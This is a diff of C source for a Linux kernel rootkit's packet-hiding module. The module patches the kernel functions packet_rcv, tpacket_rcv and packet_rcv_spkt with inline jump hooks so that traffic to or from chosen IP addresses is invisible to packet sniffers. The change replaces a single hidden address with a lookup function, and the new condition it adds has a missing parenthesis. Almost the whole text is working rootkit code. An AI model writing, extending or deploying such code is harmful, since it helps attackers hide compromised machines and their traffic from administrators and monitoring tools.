@@ -11,18 +11,10 @@ int manipulated_packet_rcv (struct sk_buff* skb, struct net_device* dev, struct 
 int manipulated_tpacket_rcv (struct sk_buff* skb, struct net_device* dev, struct packet_type* pt, struct net_device* orig_dev);
 int manipulated_packet_rcv_spkt (struct sk_buff* skb, struct net_device* dev, struct packet_type* pt, struct net_device* orig_dev);
 
-
-
-
-
-
 /* the functions that are being hooked */
 int (*packet_rcv)(struct sk_buff*, struct net_device*, struct packet_type*, struct net_device*) = (void *) sysmap_packet_rcv;
 int (*packet_rcv_spkt)(struct sk_buff*, struct net_device*, struct packet_type*, struct net_device*) = (void *) sysmap_packet_rcv_spkt;
 int (*tpacket_rcv)(struct sk_buff*, struct net_device*, struct packet_type*, struct net_device*) = (void *) sysmap_tpacket_rcv;
-
-/* the ip to be hidden */
-static unsigned int hidden_ip = 0;
 
 /* spinlocks for each function we hook */
 spinlock_t packet_rcv_lock;
@@ -36,22 +28,27 @@ unsigned long packet_rcv_spkt_flags;
 char hook[6] = { 0x68, 0x00, 0x00, 0x00, 0x00, 0xc3 };
 unsigned int *target = (unsigned int *) (hook + 1);
 
-/* code of the original functions that has been overwritten by us */
+/* code of the original functions that have been overwritten by us */
 char original_packet_rcv[6];
 char original_tpacket_rcv[6];
 char original_packet_rcv_spkt[6];
 
-/* check if we need to hide this particular packet */
+/*
+ * check if we need to hide this particular packet
+ */
 int
 is_packet_hidden (struct sk_buff *skb)
 {
 	if (skb->protocol == htons(ETH_P_IP)) {
 		struct iphdr* iphdr = (struct iphdr*) skb_network_header(skb);
 
-		if (iphdr->saddr == hidden_ip || iphdr->daddr == hidden_ip){
+		if (is_ip_hidden(iphdr->saddr)
+				|| is_ip_hidden(iphdr->daddr) {
+			
 			return 1;
 		}
-	}	
+	}
+	
 	return 0;
 }
 
@@ -227,16 +224,10 @@ manipulated_packet_rcv_spkt (struct sk_buff* skb, struct net_device* dev, struct
 }
 
 /* hooks all functions needed to hide packets */
-void
+int
 load_packet_hiding (char *ipv4_addr)
-{
-	u8 dst[4];
-        
+{        
 	ROOTKIT_DEBUG("Loading packet hiding...\n");
-
-	/* convert ip string to an int array */	
-	in4_pton(ipv4_addr, -1, dst, -1, NULL);
-	hidden_ip = *(unsigned int *)dst;
 
 	/* do the initial hook of all three functions */
 	spin_lock_irqsave(&packet_rcv_lock, packet_rcv_flags);
@@ -251,7 +242,9 @@ load_packet_hiding (char *ipv4_addr)
 	hook_packet_rcv_spkt();
 	spin_unlock_irqrestore(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);
 
+	/* log and return */
 	ROOTKIT_DEBUG("Done.\n");
+	return 0;
 }
 
 /* unhooks all functions */
